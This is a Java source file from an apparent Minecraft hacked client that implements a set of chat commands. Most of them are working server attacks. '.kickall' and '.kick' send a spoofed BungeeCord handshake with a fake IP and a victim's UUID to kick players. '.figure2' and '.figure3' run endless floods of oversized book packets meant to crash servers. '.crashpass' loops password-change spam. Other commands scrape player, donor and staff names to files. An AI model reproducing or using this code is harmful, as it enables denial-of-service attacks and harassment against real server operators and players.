package jessica.commands;

import net.minecraft.item.*;
import net.minecraft.init.*;
import net.minecraft.client.*;
import net.minecraft.client.multiplayer.*;
import net.minecraft.network.*;
import net.minecraft.network.handshake.client.*;
import com.mojang.authlib.*;
import net.minecraft.network.login.client.*;
import net.minecraft.client.network.*;
import jessica.Wrapper;
import jessica.managers.FileManager;
import jessica.managers.FriendManager;
import jessica.managers.ModuleManager;
import jessica.module.Module;
import jessica.modules.UserInterface;
import jessica.utils.*;
import java.io.*;
import java.nio.charset.*;
import java.text.DecimalFormat;
import java.text.DecimalFormatSymbols;
import java.text.NumberFormat;
import java.text.SimpleDateFormat;

import net.minecraft.nbt.*;
import net.minecraft.inventory.*;
import java.util.*;

import org.lwjgl.input.Keyboard;

import net.minecraft.client.gui.*;
import net.minecraft.network.play.client.*;
import net.minecraft.scoreboard.ScorePlayerTeam;

import java.net.*;
import com.google.common.base.*;

public class ChatCommands
{
    public static boolean isGetData;
    public static String fileData;
    public static String fileList;
    public static String IPKick;
    public static int PortKick;
    public static int delayList;
    public static String key;
    public static String nickchange;
    private static ItemStack book;
    private static ItemStack sign;
    private static String changeMessageFromServer;
    private static int BThread;
    private static HashSet pluginChannels;
    public static int tick = 0;
    
    static {
        ChatCommands.isGetData = false;
        ChatCommands.fileData = "";
        ChatCommands.fileList = "";
        ChatCommands.delayList = 2000;
        ChatCommands.book = new ItemStack(Items.WRITTEN_BOOK);
        ChatCommands.sign = new ItemStack(Items.SIGN);
        ChatCommands.changeMessageFromServer = "{from_server}";
        ChatCommands.BThread = 0;
        ChatCommands.pluginChannels = new HashSet();
    }
    
    public static String decimalFormat(Number value, int maxvalue) {
        DecimalFormat decimalFormat = new DecimalFormat("0", DecimalFormatSymbols.getInstance(Locale.ENGLISH));
        decimalFormat.setMaximumFractionDigits(maxvalue);
        return decimalFormat.format(value);
    }
    
	public static void commands(final String message) {
		String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(Calendar.getInstance().getTime());
        if (message.startsWith(".say")) {
            try {
                Wrapper.sendPacket(new CPacketChatMessage(message.split(".say ")[1]));
                return;
            }
            catch (Exception ex) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.say [Message]", true);
            }
        }
        if (message.equalsIgnoreCase(".help") || message.equalsIgnoreCase(".help 1")) {
            Wrapper.msg("", true);
            Wrapper.msg("&a.creativefind - Get list of players in CREATIVE mode.", false);
            Wrapper.msg("&a.playerfind - Get list all of players.", false);
            Wrapper.msg("&a.donatefind - Get list all of players who have got donate.", false);
            Wrapper.msg("&a.kickall [IP] [Port] - Kick all players (IPWhiteList).", false);
            Wrapper.msg("&a.setkick [IP] [Port] - Set IP:Port of server for kick player.", false);
            Wrapper.msg("&a.kick [Nick] - Kick player.", false);
            Wrapper.msg("&a.friend add [Nick] - Add player in list of friends.", false);
            Wrapper.msg("&a.friend del [Nick] - Delete player from list of friends.", false);
            Wrapper.msg("&a.nickchange [Nick] - Hide your nick.", false);
            Wrapper.msg("&a.getuuid [Nick] - Get player's UUID.", false);
            Wrapper.msg("&a.getbaltop [Start Page] [End Page] - get all players from baltop.", false);
            Wrapper.msg("&a.say [Message] - send message to chat.", false);
            Wrapper.msg("&a.figure2 - packet attack to server (Requires 2 or more clients).", false);
            Wrapper.msg("&a.crashpass [Your password] [Random password] - password change crash.", false);
            Wrapper.msg("&a.bind - binding.", false);
            Wrapper.msg("&a.toggle [Module] - on/off module.", false);
            Wrapper.msg("&a.figure3 - packet attack to server (Requires 2 or more clients).", false);
            Wrapper.msg("&a.setlist [Path to file] - set path to file with lines for spam (Send {from_list} to chat).", false);
            Wrapper.msg("&a.setdelay [Delay in milliseconds] - set delay for spam.", false);
            Wrapper.msg("&a.startserver [Port] - start chat server.", false);
            Wrapper.msg("&a.toserver [IP] [Port] [Message] - send message to chat server.", false);
            Wrapper.msg("&a.serverinfo - get information about server where you in.", false);
        }
        if (message.equalsIgnoreCase(".creativefind")) {
            final NetHandlerPlayClient connection = Wrapper.player().connection;
            final List<NetworkPlayerInfo> players = (List<NetworkPlayerInfo>)GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy((Iterable)connection.getPlayerInfoMap());
            Wrapper.getFiles();
            final File txt = new File(String.valueOf(FileManager.getClientDir()) + "CreativeFinder\\" + Wrapper.mc().getCurrentServerData().serverIP.split(":")[0] + timeStamp + ".txt");
            if (txt.exists()) {
                txt.delete();
            }
            for (final NetworkPlayerInfo n : players) {
                if (n.getGameType().isCreative()) {
                    Wrapper.getFiles();
                    FileManager.write(txt, n.getGameProfile().getName());
                }
            }
            Wrapper.msg("&eList of players in &6CREATIVE MODE &esaved in file", true);
            Wrapper.msg("&e" + txt.getPath(), false);
        }
        if (message.equalsIgnoreCase(".playerfind")) {
            final NetHandlerPlayClient connection = Wrapper.player().connection;
            final List<NetworkPlayerInfo> players = (List<NetworkPlayerInfo>)GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy((Iterable)connection.getPlayerInfoMap());
            Wrapper.getFiles();
            final File txt = new File(String.valueOf(FileManager.getClientDir()) + "PlayerFinder\\" + Wrapper.mc().getCurrentServerData().serverIP.split(":")[0] + timeStamp + ".txt");
            if (txt.exists()) {
                txt.delete();
            }
            for (final NetworkPlayerInfo n : players) {
                Wrapper.getFiles();
                FileManager.write(txt, n.getGameProfile().getName());
            }
            Wrapper.msg("&eList of players saved in file", true);
            Wrapper.msg("&e" + txt.getPath(), false);
        }
        
        if (message.equalsIgnoreCase(".donatefind")) {
            final NetHandlerPlayClient connection = Wrapper.player().connection;
            final List<NetworkPlayerInfo> players = (List<NetworkPlayerInfo>)GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy((Iterable)connection.getPlayerInfoMap());
            Wrapper.getFiles();
            final File txt = new File(String.valueOf(FileManager.getClientDir()) + "DonateFinder\\" + Wrapper.mc().getCurrentServerData().serverIP.split(":")[0] + 
            timeStamp + ".txt");
            if (txt.exists()) {
                txt.delete();
            }
            for(NetworkPlayerInfo p : Minecraft.getMinecraft().getConnection().getPlayerInfoMap()) {
                String name = p.getDisplayName() != null ? p.getDisplayName().getFormattedText() : 
                	ScorePlayerTeam.formatPlayerName(p.getPlayerTeam(), p.getGameProfile().getName());
                    Wrapper.getFiles();
                    if(name.contains("Вип") || name.contains("Премиум") // MineBlaze & Dexland
                    || name.contains("Креатив") || name.contains("Легенда") // Survival		
                    || name.contains("Модер") || name.contains("Админ")
                    || name.contains("Гл.Админ") || name.contains("Энигма")
                    || name.contains("Император") || name.contains("Делюкс")
                    || name.contains("Помощник") || name.contains("Опка")
                    || name.contains("Хелпер") || name.contains("Блейз")
                    || name.contains("Лорд") || name.contains("Элита")
                    || name.contains("Титан") || name.contains("Ютубер")
                    || name.contains("Опка") || name.contains("Владелец")
                    || name.contains("Основатель") || name.contains("Оператор")
                    || name.contains("Создатель") || name.contains("Разработчик")
                    || name.contains("АнтиГрифер") || name.contains("Властелин")
                    || name.contains("Старшина") || name.contains("Майор")
                    || name.contains("Цезарь") || name.contains("Бог")
                    || name.contains("Супер-Админ")
                    || name.contains("Генерал") || name.contains("Маршал")
                    || name.contains("Рядовой") || name.contains("Лейтенант")
                    || name.contains("Капитан") || name.contains("Сталкер")
                    || name.contains("Сталкер+") || name.contains("Монолит")
                    || name.contains("Барон") || name.contains("Страж")
                    || name.contains("Герой") || name.contains("Аспид")
                    || name.contains("Глава") || name.contains("Герцог")
                    || name.contains("Смертный") || name.contains("Скелет")
                    || name.contains("Труповозка") || name.contains("Гробовщик")
                    || name.contains("Демон") || name.contains("Повелитель")
                    || name.contains("ПТ") || name.contains("Дозорный")
                    
                    || name.contains("GOLD") || name.contains("DIAMOND") // BedWars
                    || name.contains("EMERALD") || name.contains("MAGMA")
                    || name.contains("LEGEND")
                    || name.contains("SILVER") || name.contains("SUPREME") // Anarchy
                    || name.contains("WITHER") || name.contains("HERO")
                    || name.contains("AVENGER") || name.contains("LEGEND")
                    || name.contains("PHANTOM") || name.contains("PHOENIX")
                    || name.contains("ENDER")

                    || name.contains("VIP") || name.contains("PREM")
                    || name.contains("MASTER") || name.contains("LEGENDA")
                    || name.contains("TITAN") || name.contains("MINISTR")
                    || name.contains("ROLEX") || name.contains("DIVINE")
                    || name.contains("GLOBAL") || name.contains("PREM")
                    || name.contains("GOD") || name.contains("OVERLORD")
                    || name.contains("MAGISTER") || name.contains("IMPERATOR")
                    || name.contains("DRAGON") || name.contains("TIGER")
                    || name.contains("HELPER")
                    
                    || name.contains("Crystal") || name.contains("Ruby")
                    || name.contains("Titan") || name.contains("Legend")
                    || name.contains("Warden") || name.contains("Iron")
                    
                    || name.contains("ДОНОР") || name.contains("ВИП")
                    || name.contains("ВОИН") || name.contains("СТРАННИК")
                    || name.contains("КАРАТЕЛЬ") || name.contains("МАСТЕР")
                    || name.contains("КНЯЗЬ")
                    || name.contains("ПРЕМИУМ") || name.contains("КРЕАТИВ")
                    || name.contains("ДЕЛЮКС") || name.contains("ЛЕГЕНДА")
                    || name.contains("ДРАКОН") || name.contains("БОГ")
                    || name.contains("ОВЕРЛОРД") || name.contains("МОДЕРАТОР")
                    || name.contains("АДМИН") || name.contains("ЛОРД")
                    || name.contains("С-АДМИН") || name.contains("УЛЬТРА")
                    || name.contains("ОСНОВАТЕЛЬ") || name.contains("БОСС")
                    || name.contains("ДИРЕКТОР") || name.contains("ДЕПУТАТ")
                    || name.contains("КОРОЛЬ") || name.contains("МОДЕР")
                    || name.contains("АНТИ-ГРИФЕР") || name.contains("ВЛАДЕЛЕЦ")
                    || name.contains("ВЛАСТЕЛИН") || name.contains("ГЛАВА")
                    || name.contains("ОПЕРАТОР") || name.contains("ХЕЛПЕР")
                    || name.contains("ПРЕЗИДЕНТ") || name.contains("ПРАВИТЕЛЬ")
                    || name.contains("БАРОН") || name.contains("ВЛАДЫКА")
                    || name.contains("СУЛТАН") || name.contains("МАЖОР")
                    || name.contains("ГЕРОЙ") || name.contains("ПРИНЦ")
                    || name.contains("ПРИЗРАК") || name.contains("АНГЕЛ")
                    || name.contains("ДЕМОН") || name.contains("ЛЮЦИФЕР")
                    || name.contains("ДЕДМОРОЗ") || name.contains("МЛ.АДМИН")
                    || name.contains("ХОЗЯИН") || name.contains("ГОСПОДЬ")
                    || name.contains("СПОНСОР") || name.contains("САНТА")
                    || name.contains("СОЗДАТЕЛЬ") || name.contains("КРЕАТИВ"))
                    FileManager.write(txt, name.replaceAll("§0", "").replaceAll("§1", "").replaceAll("§2", "").replaceAll("§3", "").replaceAll("§4", "").replaceAll("§5", "").replaceAll("§6", "").replaceAll("§7", "").replaceAll("§8", "").replaceAll("§9", "")
                    .replaceAll("§a", "").replaceAll("§b", "").replaceAll("§c", "").replaceAll("§d", "").replaceAll("§e", "").replaceAll("§f", "")
                    .replaceAll("§k", "").replaceAll("§l", "").replaceAll("§m", "").replaceAll("§n", "").replaceAll("§o", "").replaceAll("§r", "").replaceAll(" ", ":"));
                }
            Wrapper.msg("&eList of players who have &6donate &esaved in file", true);
            Wrapper.msg("&e" + txt.getPath(), false);
        }
        if (message.startsWith(".kickall")) {
            new Thread() {
                @Override
                public void run() {
                    try {
                        final String[] s = message.split(" ");
                        final int port = Integer.parseInt(s[2]);
                        final NetHandlerPlayClient connection = Wrapper.player().connection;
                        final List<NetworkPlayerInfo> players = (List<NetworkPlayerInfo>)GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy((Iterable)connection.getPlayerInfoMap());
                        for (final NetworkPlayerInfo n : players) {
                            if (!n.getGameProfile().getId().toString().equals(Wrapper.player().getUniqueID().toString())) {
                                final Random rand = new Random();
                                InetAddress var1 = null;
                                var1 = InetAddress.getByName(s[1]);
                                (GuiConnecting.networkManager2 = NetworkManager.createNetworkManagerAndConnect(var1, port, Minecraft.getMinecraft().gameSettings.isUsingNativeTransport())).setNetHandler(new NetHandlerLoginClient(GuiConnecting.networkManager2, Minecraft.getMinecraft(), new GuiIngameMenu()));
                                GuiConnecting.networkManager2.sendPacket(new C00Handshake(String.valueOf(s[1]) + "\u0000" + "32.123." + String.valueOf(rand.nextInt(255)) + "." + String.valueOf(rand.nextInt(255)) + "\u0000" + n.getGameProfile().getId().toString(), port, EnumConnectionState.LOGIN));
                                GuiConnecting.networkManager2.sendPacket(new CPacketLoginStart(new GameProfile((UUID)null, String.valueOf(n.getGameProfile().getName()) + "B")));
                                Thread.sleep(0L);
                            }
                        }
                        Wrapper.msg("&eKickAll.", true);
                    }
                    catch (Exception ex) {
                        Wrapper.msg("&cError! Correct:", true);
                        Wrapper.msg("&a.kickall [IP] [Port]", true);
                    }
                }
            }.start();
        }
        if (message.startsWith(".setkick")) {
            try {
                final String[] s2 = message.split(" ");
                ChatCommands.IPKick = s2[1];
                ChatCommands.PortKick = Integer.parseInt(s2[2]);
                Wrapper.msg("&aKick on server: &e" + ChatCommands.IPKick + ":" + ChatCommands.PortKick + "&a.", true);
            }
            catch (Exception ex) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.setkick [IP] [Port]", true);
            }
        }
        if (message.startsWith(".crashpass")) {
        	int а;
            try {
                Wrapper.msg("&aAttack!", true);
                final String[] s2 = message.split(" ");
                String var1_pass = s2[1];
                String var2_pass = s2[2];
                new Thread() {
                    @Override
                    public void run() {
                        for (int a = 1; a < 99999; a++) {
                            (Minecraft.getMinecraft()).player.connection.sendPacket((Packet) new CPacketChatMessage("/changepassword " + var1_pass + " " + var2_pass));
                            (Minecraft.getMinecraft()).player.connection.sendPacket((Packet) new CPacketChatMessage("/changepassword " + var2_pass + " " + var1_pass));
                        }
                    }
                }.start();
            } catch (Exception ex) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.crashpass [Your password] [Random password]", true);
            }
        }
        if (message.startsWith(".kick")) {
            new Thread() {
                @Override
                public void run() {
                    try {
                        final String[] s = message.split(" ");
                        final NetHandlerPlayClient connection = Wrapper.player().connection;
                        final List<NetworkPlayerInfo> players = (List<NetworkPlayerInfo>)GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy((Iterable)connection.getPlayerInfoMap());
                        for (final NetworkPlayerInfo n : players) {
                            if (n.getGameProfile().getName().equals(s[1])) {
                                final Random rand = new Random();
                                InetAddress var1 = null;
                                var1 = InetAddress.getByName(ChatCommands.IPKick);
                                (GuiConnecting.networkManager2 = NetworkManager.createNetworkManagerAndConnect(var1, ChatCommands.PortKick, Minecraft.getMinecraft().gameSettings.isUsingNativeTransport())).setNetHandler(new NetHandlerLoginClient(GuiConnecting.networkManager2, Minecraft.getMinecraft(), new GuiIngameMenu()));
                                GuiConnecting.networkManager2.sendPacket(new C00Handshake(String.valueOf(ChatCommands.IPKick) + "\u0000" + "32.123." + String.valueOf(rand.nextInt(255)) + "." + String.valueOf(rand.nextInt(255)) + "\u0000" + n.getGameProfile().getId().toString(), ChatCommands.PortKick, EnumConnectionState.LOGIN));
                                GuiConnecting.networkManager2.sendPacket(new CPacketLoginStart(n.getGameProfile()));
                                Wrapper.msg("&eKick player " + n.getGameProfile().getName() + ".", true);
                            }
                        }
                    }
                    catch (Exception ex) {
                        Wrapper.msg("&cError! Correct:", true);
                        Wrapper.msg("&a.kickall [IP] [Port]", true);
                    }
                }
            }.start();
        }
        if (message.startsWith(".nickchange")) {
            try {
                ChatCommands.nickchange = message.split(".nickchange ")[1];
                Wrapper.msg("Nick changed.", true);
            }
            catch (Exception e2) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.nickchange [Nick]", true);
            }
        }
        if (message.equalsIgnoreCase(".getuuid2")) {
            try {
                Wrapper.msg(Wrapper.player().getUniqueID().toString(), true);
            }
            catch (Exception e2) {
                Wrapper.msg("&cError!", true);
            }
        }
        if (message.equalsIgnoreCase(".getuuid")) {
            try {
                final String nick = message.split(".getuuid ")[1];
                final NetHandlerPlayClient connection2 = Wrapper.player().connection;
                final List<NetworkPlayerInfo> players2 = (List<NetworkPlayerInfo>)GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy((Iterable)connection2.getPlayerInfoMap());
                for (final NetworkPlayerInfo n : players2) {
                    Wrapper.msg(n.getGameProfile().getId().toString(), true);
                }
            }
            catch (Exception e2) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.getuuid [Nick]", true);
            }
        }
        final String[] args = message.split(" ");
        if (args[0].equalsIgnoreCase(".toggle")) {
            try {
                final Module m = ModuleManager.getModule(args[1]);
                if (m == null) {
                    Wrapper.msg("&cError! Correct:", true);
                    Wrapper.msg("&a.toggle [Module]", false);
                }
                m.toggle();
                if (m.isToggled()) {
                    Wrapper.player().connection.gameController.ingameGUI.displayTitle("Функция " + m.getName() + " enabled", "", 1, 3, 1);
                }
                else {
                    Wrapper.player().connection.gameController.ingameGUI.displayTitle("Функция " + m.getName() + " disabled", "", 1, 3, 1);
                }
            }
            catch (Exception ex2) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.toggle [Module]", false);
            }
        }
        if (args[0].equalsIgnoreCase(".bind")) {
            try {
                if (args[1].equalsIgnoreCase("add")) {
                	Module m = ModuleManager.getModule(args[3]);
                    m.setKeyBind(Keyboard.getKeyIndex(args[2].toUpperCase()));
                    Wrapper.msg("&aModule \"" + m.getName() + "\" binded on key " + args[2].toUpperCase() + ".", true);
                }
                else if (args[1].equalsIgnoreCase("del")) {
                	Module m = ModuleManager.getModule(args[2]);
                	Wrapper.msg("&aDeleted bind from module " + m.getName() + ".", true);
                	m.setKeyBind(-1);
                }
                else if (args[1].equalsIgnoreCase("reset")) {
                	for(Module m : ModuleManager.getModules().values()) {
                		if(!(m instanceof UserInterface)) {
                			m.setKeyBind(-1);
                		}
                	}
                	Wrapper.msg("&aDeleted all binds.", true);
                }
            
                Wrapper.getFiles().saveBinds();
            }
            catch (Exception ex2) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.bind reset - delete all binds.", false);
                Wrapper.msg("&a.bind del [module] - delete bind.", false);
                Wrapper.msg("&a.bind add [key] [module] - add bind.", false);
            }
        }
        if (args[0].equalsIgnoreCase(".friend")) {
            try {
                if (args[1].equalsIgnoreCase("add")) {
                    FriendManager.addFriend(message.substring(12, message.length()));
                }
                else if (args[1].equalsIgnoreCase("del")) {
                    FriendManager.delFriend(message.substring(12, message.length()));
                }
                Wrapper.getFiles().saveFriends();
            }
            catch (Exception ex2) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.friend del [nick] - delete friend.", false);
                Wrapper.msg("&a.friend add [nick] - add friend.", false);
            }
        }
        if (args[0].equalsIgnoreCase(".figure2")) {
            new Thread() {
                @Override
                public void run() {
                    try {
                        Wrapper.msg("Attack!", true);
                        final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                        final NBTTagList list = new NBTTagList();
                        final NBTTagCompound tag = new NBTTagCompound();
                        final String author = Minecraft.getMinecraft().getSession().getUsername();
                        final String title = "Title";
                        final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                        for (int i = 0; i < 50; ++i) {
                            final String siteContent = size;
                            final NBTTagString tString = new NBTTagString(siteContent);
                            list.appendTag(tString);
                        }
                        tag.setString("author", author);
                        tag.setString("title", title);
                        tag.setTag("pages", list);
                        bookObj.setTagInfo("pages", list);
                        bookObj.setTagCompound(tag);
                        while (true) {
                            Wrapper.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
                            Thread.sleep(12L);
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        }
        if (message.startsWith(".getbaltop")) {
            new Thread() {
                @Override
                public void run() {
                    try {
                        Wrapper.getFiles();
                        final File txt = new File(String.valueOf(FileManager.getClientDir()) + "BalTop\\" + Wrapper.mc().getCurrentServerData().serverIP.split(":")[0] + ".txt");
                        final List<String> list = new ArrayList<String>();
                        for (int i = Integer.parseInt(message.split(" ")[1]); i <= Integer.parseInt(message.split(" ")[2]); ++i) {
                            Wrapper.player().sendChatMessage("/baltop " + i);
                            Thread.sleep(2000L);
                            try {
                                for (final ChatLine cl : Wrapper.mc().ingameGUI.getChatGUI().chatLines) {
                                    try {
                                        final String name = cl.getChatComponent().getUnformattedText().split("[0-9]\\. ")[1].split(",")[0];
                                        if (list.contains(name)) {
                                            continue;
                                        }
                                        list.add(name);
                                    }
                                    catch (Exception ex) {}
                                }
                            }
                            catch (Exception ex2) {}
                        }
                        String listNicks = "";
                        for (final String s : list) {
                            listNicks = String.valueOf(listNicks) + s + "\r\n";
                        }
                        if (listNicks.endsWith("\r\n")) {
                            listNicks = listNicks.substring(0, listNicks.length() - 2);
                        }
                        Wrapper.getFiles();
                        FileManager.write(txt, listNicks);
                        Wrapper.msg("Saved to " + txt.getPath(), true);
                    }
                    catch (Exception e) {
                        Wrapper.msg("&cError! Correct:", true);
                        Wrapper.msg("&a.getbaltop [Start Page] [End Page]", true);
                    }
                }
            }.start();
        }
        if (message.startsWith(".svsgetdata")) {
            try {
                if (message.split(" ")[1].equalsIgnoreCase("off")) {
                    ChatCommands.isGetData = false;
                    Wrapper.msg("&cSVS getter data OFF!", true);
                    return;
                }
                ChatCommands.isGetData = true;
                ChatCommands.fileData = message.split(" ")[1];
                Wrapper.msg("&cSVS getter data enabled and setted on file: " + ChatCommands.fileData, true);
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.svsgetdata [File name] | [off]", true);
            }
        }
        if (message.startsWith(".setlist ")) {
            try {
                ChatCommands.fileList = message.split(".setlist ")[1];
                Wrapper.msg("&cPath to file: " + ChatCommands.fileList, true);
                Wrapper.getFiles().saveValues();
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.setlist [Path to file]", true);
            }
        }
        if (message.startsWith(".setdelay ")) {
            try {
                ChatCommands.delayList = Integer.parseInt(message.split(".setdelay ")[1]);
                Wrapper.msg("&cDelay for list: " + ChatCommands.delayList, true);
                Wrapper.getFiles().saveValues();
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.delaylist [Delay]", true);
            }
        }
        if (args[0].equalsIgnoreCase(".figure3")) {
            new Thread() {
                @Override
                public void run() {
                    try {
                        Wrapper.msg("Attack!", true);
                        final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                        final NBTTagList list = new NBTTagList();
                        final NBTTagCompound tag = new NBTTagCompound();
                        final String author = Minecraft.getMinecraft().getSession().getUsername();
                        final String title = "Title";
                        final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                        for (int i = 0; i < 50; ++i) {
                            final String siteContent = size;
                            final NBTTagString tString = new NBTTagString(siteContent);
                            list.appendTag(tString);
                        }
                        tag.setString("author", author);
                        tag.setString("title", title);
                        tag.setTag("pages", list);
                        bookObj.setTagInfo("pages", list);
                        bookObj.setTagCompound(tag);
                        while (true) {
                            Wrapper.sendPacket(new CPacketCreativeInventoryAction(36, bookObj));
                            Thread.sleep(12L);
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        }
        if (message.startsWith(".startserver ")) {
            final Thread serverThread = new Thread() {
                @Override
                public void run() {
                    try {
                        Wrapper.msg("&cServer started on port " + Integer.parseInt(message.split(".startserver ")[1]), true);
                        final DatagramSocket socket = new DatagramSocket(Integer.parseInt(message.split(".startserver ")[1]));
                        final byte[] buf = new byte[256];
                        while (true) {
                            DatagramPacket packet = new DatagramPacket(buf, buf.length);
                            socket.receive(packet);
                            final InetAddress address = packet.getAddress();
                            final int port = packet.getPort();
                            packet = new DatagramPacket(buf, buf.length, address, port);
                            final String received = new String(packet.getData(), 0, packet.getLength());
                            Wrapper.player().sendChatMessage(ChatCommands.changeMessageFromServer.replace("{from_server}", received));
                        }
                    }
                    catch (Exception e) {
                        Wrapper.msg("&cError! Correct:", true);
                        Wrapper.msg("&a.startserver [Port]", true);
                    }
                }
            };
            serverThread.start();
        }
        if (message.startsWith(".setfromserver ")) {
            try {
                if (!message.split(".setfromserver ")[1].contains("{from_server}")) {
                    throw new Exception();
                }
                ChatCommands.changeMessageFromServer = message.split(".setfromserver ")[1];
                Wrapper.msg("&cMessage changed!", true);
            }
            catch (Exception e) {
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.setfromserver [Message with {from_server}]", true);
            }
        }
        if (message.startsWith(".toserver ")) {
            try {
                final String sIP = message.split(" ")[1];
                final int sPort = Integer.parseInt(message.split(" ")[2]);
                final DatagramSocket socket = new DatagramSocket();
                final InetAddress address = InetAddress.getByName(sIP);
                final String toServer = message.split(".toserver " + sIP + " " + sPort + " ")[1];
                final byte[] buf = toServer.getBytes();
                final DatagramPacket packet = new DatagramPacket(buf, buf.length, address, sPort);
                socket.send(packet);
                Wrapper.msg("&cMessage was sent!", true);
            }
            catch (Exception e) {
                e.printStackTrace();
                Wrapper.msg("&cError! Correct:", true);
                Wrapper.msg("&a.toserver [IP] [Port] [Message]", true);
            }
        }
        String ip;
        String brand;
        if (message.equalsIgnoreCase(".serverinfo")) {
        	ip = Wrapper.mc().player.connection.getNetworkManager().getRemoteAddress().toString();
        	brand = Wrapper.mc().player.getServerBrand();
            Wrapper.msg("&eIP: &a" + ip, true);
            Wrapper.msg("&eBrand: &a" + brand, true);
        }
    }
    
    public static String format(final Iterable<?> objects, final String separators) {
        return Joiner.on(separators).join((Iterable)objects);
    }
}
